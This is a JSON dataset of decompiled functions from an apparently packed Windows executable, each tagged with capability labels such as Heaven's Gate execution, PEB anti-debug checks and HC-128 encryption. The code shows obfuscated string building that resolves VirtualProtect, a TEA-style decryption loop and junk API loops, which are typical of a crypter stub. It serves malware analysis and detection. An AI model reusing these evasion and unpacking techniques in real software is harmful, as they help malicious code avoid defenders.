{
    "0040449a": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.0040449a(void)\n\n{\n    *0xa8e050 = 100;\n    *0xa8e04b = 0x6d;\n    *0xa8e051 = 0x6c;\n    *0xa8e04f = 0x2e;\n    *0xa8e052 = 0x6c;\n    *0xa8e04e = 0x32;\n    *0xa8e04a = 0x69;\n    *0xa8e048 = 0x6d;\n    *0xa8e049 = 0x73;\n    *0xa8e04d = 0x33;\n    *0xa8e053 = 0;\n    *0xa8e04c = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0xa8e048);\n    return;\n}\n",
        "token_count": 198
    },
    "00404dba": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00404dba(void)\n\n{\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xa8e048;\n    *0xa8e04e = 0x33;\n    *0xa8e04f = 0x32;\n    *0xa8e053 = 0x6c;\n    *0xa8e052 = 0x6c;\n    *0xa8e04b = 0x6e;\n    *0xa8e04d = 0x6c;\n    *0xa8e048 = 0x6b;\n    *0xa8e04c = 0x65;\n    *0xa8e04a = 0x72;\n    *0xa8e050 = 0x2e;\n    *0xa8e051 = 100;\n    *0xa8e049 = 0x65;\n    *0xa8e054 = 0;\n    uStack16 = 0x404e23;\n    *0xaa7290 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uStack16 = 0xa8e048;\n    *0xa8e053 = 0x65;\n    *0xa8e049 = 0x69;\n    *0xa8e04c = 0x75;\n    *0xa8e04e = 0x6c;\n    *0xa8e04d = 0x61;\n    *0xa8e051 = 0x6f;\n    *0xa8e055 = 0x74;\n    *0xa8e048 = 0x56;\n    *0xa8e054 = 99;\n    *0xa8e04f = 0x50;\n    *0xa8e056 = 0;\n    *0xa8e04b = 0x74;\n    *0xa8e052 = 0x74;\n    *0xa8e04a = 0x72;\n    *0xa8e050 = 0x72;\n    *0xa8e044 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0xaa7290);\n    (**0xa8e044)(*0xaa6e40, *0xaa7294, 0x40, &stack0xfffffff0);\n    return;\n}\n",
        "token_count": 515
    },
    "00404be2": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404be2(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t extraout_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puVar4 = arg_8h;\n    iVar1 = *arg_ch;\n    arg_ch_00 = arg_ch[1];\n    uVar5 = arg_8h[1];\n    iVar2 = arg_ch[2];\n    iVar3 = arg_ch[3];\n    uVar6 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    var_ch = 0x20;\n    do {\n        var_8h = uVar6 * 0x10 + iVar2;\n        arg_8h = (uVar6 >> 5) + iVar3;\n        *0xaa6e44 = 0xffcf03fc;\n        fcn.00404536(&var_8h, var_4h + uVar6);\n        *0xaa6e44 = 0;\n        *0xaa6e4c = 0xffffffff;\n        uVar5 = uVar5 - (arg_8h ^ var_8h);\n        arg_8h = uVar5 >> 5;\n        *0xaa6e48 = 0xff6b3619;\n        fcn.00404bc5(&arg_8h, arg_ch_00);\n        uVar6 = uVar6 - (uVar5 * 0x10 + iVar1 ^ arg_8h ^ extraout_EDX);\n        arg_ch = 0x9e3779b9;\n        var_4h = var_4h + 0x61c88647;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    *puVar4 = uVar6;\n    puVar4[1] = uVar5;\n    return;\n}\n",
        "token_count": 527
    },
    "00404cc0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cc0(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_400h;\n    \n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0xaa7294 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasA)(0, &var_400h, 0);\n        }\n        fcn.00404be2(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "null": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar auStack1212 [1036];\n    int32_t iStack176;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t iStack8;\n    \n    if (*0xaa7294 == 0x9e) {\n        fcn.00405c04(0, 0, 0);\n        fcn.00405ac1(0, 0);\n        fcn.0040561c();\n        fcn.004058a6(0, 0);\n        fcn.0040563d();\n    }\n    *0xaa7294 = *0x416e9c;\n    iVar1 = 0x79a863;\n    do {\n        if (*0xaa7294 == 0x4c5) {\n            (*_sym.imp.ADVAPI32.dll_AccessCheckByType)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n            uStack148 = 0;\n            uStack144 = 0;\n            (*_sym.imp.GDI32.dll_SetBrushOrgEx)(0, 0, 0, &uStack148);\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructW)(0x401578, 0x401540, auStack1212, 0, 0x4014e0);\n        }\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    uStack112 = 0x62441a81;\n    uStack44 = 0x6ecb1e8f;\n    uStack76 = 0x557aafcc;\n    uStack108 = 0xcbb3397;\n    uStack80 = 0x5e5a6f89;\n    uStack128 = 0x637f94c7;\n    uStack40 = 0x598e3ac4;\n    uStack136 = 0x2657f00e;\n    uStack84 = 0xb617013;\n    uStack100 = 0xa136c92;\n    uStack104 = 0x548e684e;\n    uStack72 = 0x598061f9;\n    uStack12 = 0x10249cff;\n    uStack48 = 0x5b4abdc6;\n    uStack88 = 0x203a2e36;\n    iStack8 = -0x5f45b22e;\n    uStack132 = 0x1e938613;\n    uStack96 = 0xc946a2bd;\n    uStack64 = 0xcd1b809c;\n    uStack68 = 0xd5d219b5;\n    uStack140 = 0x37dc4c35;\n    uStack16 = 0x8bee53e0;\n    uStack52 = 0xa42a2fd2;\n    uStack36 = 0xb7a645f6;\n    uStack120 = 0x46e0fbe9;\n    uStack60 = 0xb46f1f9f;\n    uStack116 = 0x2e9ef35;\n    uStack20 = 0xafb26f7e;\n    uStack28 = 0x84259f52;\n    uStack124 = 0x10c313c3;\n    uStack24 = 0x33ba3d9b;\n    uStack32 = 0xbf46f56e;\n    uStack56 = 0xd51a25b8;\n    uStack92 = 0xec8961d2;\n    *0xaa76a8 = *0x416008;\n    uVar2 = 0;\n    do {\n        if (uVar2 < 0x1ef75) {\n            (*_sym.imp.USER32.dll_CharUpperBuffW)(0, 0);\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n    } while ((((uVar2 < 0x1ea05600) || (iStack8 == 0xacef98)) || (iStack176 == 0xad6910c)) &&\n            (uVar2 = uVar2 + 1,  uVar2 < 0x8deecc68));\n    fcn.00404eca();\n    return 0;\n}\n",
        "token_count": 1172
    },
    "004055ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004055ce(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    uint in_stack_fffffff0;\n    \n    if ((param_2 != '\\0') && (7 < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            in_stack_fffffff0 = arg_10h;\n            fcn.004055aa(param_1 + 4, 8, arg_10h, param_3);\n        }\n        fcn.00405540(arg_10h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x18) = 7;\n    fcn.00405582(in_stack_fffffff0);\n    return;\n}\n",
        "token_count": 197
    },
    "004098c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004099ba: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004099bf)\n// WARNING: Removing unreachable block (ram,0x004099ed)\n// WARNING: Removing unreachable block (ram,0x004099c5)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004098c7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004084f4(0x414648, 0x18);\n    fcn.004078b4(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0xaa786c != 1) {\n        *0xaa7868 = 1;\n        *0xaa7864 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040a46b(*0xaa8348);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040a46b(*0xaa8344);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040a462();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040a46b(*piVar2);\n                        iVar3 = fcn.0040a462();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040a46b(*0xaa8348);\n                        piVar1 = fcn.0040a46b(*0xaa8344);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00409801(0x4011e8);\n        }\n        fcn.00409801(0x4011f0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004077da(8);\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "0040ac7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac7b(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0xa8d280) {\n        return;\n    }\n    *0xaa7f48 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0xaa7f4c = &arg_8h;\n    *0xaa7e88 = 0x10001;\n    *0xaa7e30 = 0xc0000409;\n    *0xaa7e34 = 1;\n    var_328h = *0xa8d280;\n    var_324h = *0xa8d284;\n    *0xaa7e3c = unaff_retaddr;\n    *0xaa7f14 = in_GS;\n    *0xaa7f18 = in_FS;\n    *0xaa7f1c = in_ES;\n    *0xaa7f20 = in_DS;\n    *0xaa7f24 = unaff_EDI;\n    *0xaa7f28 = unaff_ESI;\n    *0xaa7f2c = unaff_EBX;\n    *0xaa7f30 = in_EDX;\n    *0xaa7f34 = in_ECX;\n    *0xaa7f38 = in_EAX;\n    *0xaa7f3c = unaff_EBP;\n    *0xaa7f40 = unaff_retaddr;\n    *0xaa7f44 = in_CS;\n    *0xaa7f50 = in_SS;\n    *0xaa7e80 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040ac73(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x40393c);\n    if (*0xaa7e80 == 0) {\n        fcn.0040ac73(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 832
    },
    "0040b885": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b885(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0xa8d280 ^ &stack0xfffffffc;\n    fcn.0040639d(arg_10h);\n    var_14h = fcn.0040f8f0(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040ee68(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040b8de:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040b91e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040b910:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040b91e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040b910;\n        goto code_r0x0040b8de;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040b91e:\n    fcn.0040ac7b(unaff_EBX);\n    return;\n}\n",
        "token_count": 511
    },
    "0040b92d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b92d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0xa8d280 ^ &stack0xfffffffc;\n    fcn.0040639d(arg_10h);\n    var_14h = fcn.0040f8f0(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040f3ac(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040b986:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040b9c6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040b9b8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040b9c6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040b9b8;\n        goto code_r0x0040b986;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040b9c6:\n    fcn.0040ac7b(unaff_EBX);\n    return;\n}\n",
        "token_count": 518
    },
    "0040df53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040df53(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004077da(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040dfad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040dfad(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040a462();\n    var_4h = 0;\n    if (*0xaa7e1c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x403930);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x403924);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0xaa7e1c = fcn.0040a3f0(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x403914);\n        *0xaa7e20 = fcn.0040a3f0(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x403900);\n        *0xaa7e24 = fcn.0040a3f0(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4038e4);\n        *0xaa7e2c = fcn.0040a3f0(uVar3);\n        if (*0xaa7e2c != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4038cc);\n            *0xaa7e28 = fcn.0040a3f0(uVar3);\n        }\n    }\n    if ((*0xaa7e28 != iVar1) && (*0xaa7e2c != iVar1)) {\n        pcVar4 = fcn.0040a46b(*0xaa7e28);\n        pcVar5 = fcn.0040a46b(*0xaa7e2c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040e0ef;\n        }\n    }\n    if ((((*0xaa7e20 != iVar1) && (pcVar4 = fcn.0040a46b(*0xaa7e20),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0xaa7e24 != iVar1 && (pcVar4 = fcn.0040a46b(*0xaa7e24),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040e0ef:\n    pcVar4 = fcn.0040a46b(*0xaa7e1c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 850
    },
    "0040ee68": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ee68(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f369;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040ef9d;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040efa4;\ncode_r0x0040ef9d:\n                        do {\n                            var_4h = 1;\ncode_r0x0040efa4:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040efb2;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040efb2:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0xa8dad4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0xa8dad4 < iVar12) {\n                if (iVar12 < *0xa8dad0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0xa8dad0;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f369;\n            }\n            var_10h = *0xa8dad4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = 